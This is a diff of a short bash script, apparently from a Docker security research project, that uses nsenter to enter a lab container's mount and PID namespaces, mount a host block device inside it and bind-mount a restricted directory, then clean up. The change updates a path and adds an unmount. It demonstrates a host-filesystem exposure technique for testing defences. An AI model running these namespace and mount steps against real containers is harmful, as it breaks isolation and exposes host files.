@@ -1,6 +1,6 @@
 #!/bin/bash
 
-attack="/home/ubuntu/Security-on-Docker/Attacks/Nsenter/Mount_hosts_filesystem"
+attack="/home/ubuntu/SecureWilly/Attacks/Nsenter/Mount_hosts_filesystem"
 
 docker ps | grep attacked_nsenter > dockerps
 cut -d' ' -f1 dockerps > containerid
@@ -17,6 +17,7 @@ nsenter --target ${container_pid} --mount --pid mkdir -p /tmpmount
 nsenter --target ${container_pid} --mount --pid -- mount ${dev} /tmpmount
 nsenter --target ${container_pid} --mount --pid -- mount -o bind /tmpmount/${attack}/restricted_area /doot
 nsenter --target ${container_pid} --mount --pid -- umount /tmpmount
+nsenter --target ${container_pid} --mount --pid -- umount /doot
 
 rm dockerps
 rm containerid
